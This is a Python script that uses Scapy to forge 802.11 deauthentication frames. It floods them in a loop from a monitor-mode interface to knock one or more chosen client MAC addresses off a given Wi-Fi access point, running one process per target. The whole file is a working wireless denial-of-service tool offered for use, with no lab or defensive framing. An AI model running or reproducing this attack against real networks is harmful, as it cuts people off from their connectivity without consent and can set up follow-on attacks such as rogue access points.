from scapy.all import Dot11, Dot11Deauth, Dot11Elt, RadioTap, sendp, hexdump
import time, sys, multiprocessing, re



class CreateSend:
  def __init__(self, target, bssid):
    #Input
    self.target = target
    self.bssid = bssid

    #Default
    self.iface = "wlan0mon"

    #Layers
    self.dot11 = Dot11(type=0, subtype=12, 
                       addr1=self.target, 
                       addr2=self.bssid, 
                       addr3=self.bssid)
              
    self.deauth = Dot11Deauth(reason=7)

    self.frame = RadioTap()/self.dot11/self.deauth

  def sendFrame(self):
    self.frame.show()
    time.sleep(3)
    # input("\nenter anything to proceed: \n")
    sendp(self.frame, inter=0.01, iface=self.iface, verbose=1, loop=1)



class MultiProcessing:
  def __init__(self, target, bssid, number):
    self.target = target
    self.bssid = bssid
    self.number = number

  def multiCreateSend(self):
    for i in range(int(self.number)):
      deauthFrame = CreateSend(self.target[i], self.bssid)
      i += 1 #because i starts with 0
      str(i) #so we can use it as a variable

      #multiprocessing
      try:
        i = multiprocessing.Process(target=deauthFrame.sendFrame)
        i.start()
      except KeyboardInterrupt:
        print('Keyboard Interrupt error detected\nprocesses stopped')
        time.sleep(1)
        sys.exit() 



class MainInput:


  def __init__(self):
    #intreger input
    input_number = input('Enter how many users you want to target: ')
    #intreger handeling
    try:
      int(input_number)
      if int(input_number) == 0:
        print('well goodbye then....')
        time.sleep(1)
        sys.exit()
    except ValueError:
      print("ValueError detected; Number automatically set to 1")
      time.sleep(1)
      input_number = int(1)

    #string input (bssid)
    input_bssid = str(input("Enter your bssid (E.g PD:2C:49:99:G1:R2): "))
    MainInput.checkMAC(mac=input_bssid)
    Targets = []
    for i in range(int(input_number)):
      i += 1
      input_target = str(input("Enter the MAC address of target number "+str(i)+":"))
      MainInput.checkMAC(input_target)
      Targets.append(input_target.capitalize())
    tuple(Targets)

    Multi = MultiProcessing(Targets, input_bssid, input_number)
    Multi.multiCreateSend()


  #mac handeling
  def checkMAC(mac):

    if re.match("[0-9a-f0]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()):
      print("succeded")
    else:
      print("Given MAC-address is invalid.")

MainInput()
